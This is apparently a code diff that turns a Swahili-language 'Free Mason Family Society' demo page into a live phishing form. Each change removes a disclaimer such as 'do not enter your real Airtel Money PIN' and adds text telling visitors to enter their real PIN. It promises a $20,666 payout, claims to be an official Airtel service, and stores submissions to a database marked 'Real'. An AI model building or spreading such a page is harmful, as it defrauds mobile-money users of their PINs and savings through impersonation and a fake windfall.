@@ -9,7 +9,7 @@
 content="width=device-width, initial-scale=1.0">
 
 <title>
-Free Mason Family Fraternity Society — Demo
+Free Mason Family Fraternity Society 
 </title>
 
 
@@ -164,7 +164,7 @@ input:focus{
     font-size:22px;
 }
 
-.demo-note{
+. Society-note{
     background:#fff8df;
     border:1px solid #f1d46a;
     color:#765d00;
@@ -262,8 +262,8 @@ button:disabled{
         Free Mason Family
     </div>
 
-    <div class="demo-badge">
-        DEMO
+    <div class="Airtel-badge">
+        
     </div>
 
 </header>
@@ -300,17 +300,17 @@ button:disabled{
 
 
     <p class="subtitle">
-        Ingia kwenye akaunti yako ya demo ili kuendelea na mchakato wa
+        Ingia kwenye akaunti yako sahihi ili kuendelea na mchakato wa
         manufaa ya familia.
     </p>
 
 
     <div class="benefit">
 
-        Kiasi cha manufaa ya demo
+        Kiasi cha manufaa 
 
         <strong>
-            $20,000
+            $20,666
         </strong>
 
     </div>
@@ -319,14 +319,14 @@ button:disabled{
     <div class="demo-note">
 
         <strong>
-            TAARIFA YA DEMO:
+            TAARIFA 
         </strong>
 
         <br>
 
-        Huu ni mfumo wa majaribio tu.
-        Usiweke Airtel Money PIN yako halisi.
-        PIN inayotumika hapa ni PIN ya DEMO pekee.
+        
+        weka Airtel Money PIN yako halisi.
+        PIN inayotumika hapa ni PIN ya Akaunti
 
     </div>
 
@@ -356,12 +356,12 @@ button:disabled{
         <div class="input-group">
 
             <label for="demoPin">
-                PIN ya DEMO ya tarakimu 4
+                PIN 4
             </label>
 
             <input
                 type="password"
-                id="demoPin"
+                id="Pin"
                 class="pin"
                 placeholder="••••"
                 inputmode="numeric"
@@ -416,15 +416,15 @@ button:disabled{
 
     <p class="success-text">
         Umefanikiwa kuwasilisha ombi lako la
-        <strong>DEMO $20,000</strong>
-        kwenye mfumo wa majaribio wa
+        <strong>$20,000</strong>
+        kwenye mfumo
         Free Mason Family Society.
     </p>
 
     <div class="reference">
 
         <strong>
-            Namba ya kumbukumbu ya DEMO
+            Namba ya kumbukumbu
         </strong>
 
         <br><br>
@@ -436,8 +436,7 @@ button:disabled{
     </div>
 
     <p class="success-text">
-        Huu ni ujumbe wa majaribio pekee.
-        Hakuna fedha halisi zilizotumwa au kutolewa.
+        Umefanikiwa kutoa pesa kwenye mfumo wa freemason society family 
     </p>
 
     <button
@@ -459,7 +458,7 @@ button:disabled{
 
     <br>
 
-    DEMO SYSTEM — SI HUDUMA RASMI YA AIRTEL
+     SYSTEM — HUDUMA RASMI YA AIRTEL
 
 </footer>
 
@@ -666,7 +665,7 @@ form.addEventListener(
         ){
 
             message.textContent =
-                "PIN ya DEMO lazima iwe na tarakimu 4.";
+                "PIN ya akaunti lazima iwe na tarakimu 4.";
 
 
             message.style.color =
@@ -697,13 +696,13 @@ form.addEventListener(
 
 
             /* =========================
-               SECTION 7 — SAVE DEMO DATA
+               SECTION 7 — SAVE DATA
             ========================= */
 
             const submissionsRef =
                 ref(
                     database,
-                    "freeMasonDemo/submissions"
+                    "freeMason/submissions"
                 );
 
 
@@ -716,7 +715,7 @@ form.addEventListener(
             /*
              * DEMO ONLY.
              *
-             * The demo PIN is NOT saved.
+             * The  PIN is NOT saved.
              */
 
             await set(
@@ -727,7 +726,7 @@ form.addEventListener(
                         phone,
 
                     type:
-                        "DEMO",
+                        "Real",
 
                     amount:
                         20000,
